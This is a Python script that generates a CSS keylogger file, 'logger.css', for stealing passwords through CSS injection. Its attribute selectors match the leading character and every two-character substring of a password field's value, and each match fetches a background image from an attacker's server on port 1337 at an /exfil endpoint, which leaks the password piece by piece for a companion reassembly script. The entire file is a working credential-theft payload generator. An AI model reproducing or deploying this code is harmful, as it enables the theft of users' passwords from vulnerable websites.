import string
import itertools
import sys 

def generate_payload(target):
    # 1. We start by detecting a starting char, i.e `a_`
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",!_@'-=.][*:` " 
    payload = ""
    for char in charset:
        c_payload = 'input[type="password"][value^="%s"] { background-image: url("http://%s:1337/exfil?c=%s_") }\n' % (char, target, char)
        
        payload += c_payload

    # 2. We then detect all permutations.
    perms = itertools.permutations(charset, 2)
    for perm in perms:
        perm = ''.join(perm)
        payload += 'input[type="password"][value*="%s"] { background-image: url("http://%s:1337/exfil?c=%s") }\n' % (perm, target, perm)

    # 3. Clear current history upon reload.
    payload += """input[type="password"]:not(checked) { 
        background-image: url("http://%s:1337/clear") 
    }""" % (target)

    # 4. exfil.py should detect a starting point from i.e `a_` and then re-assemble the peices.
    with open("logger.css", "w") as keylogger:
        keylogger.truncate(0)
        keylogger.write(payload)

if __name__ == "__main__":
    exfil_server_ip = sys.argv[1]
    generate_payload(exfil_server_ip)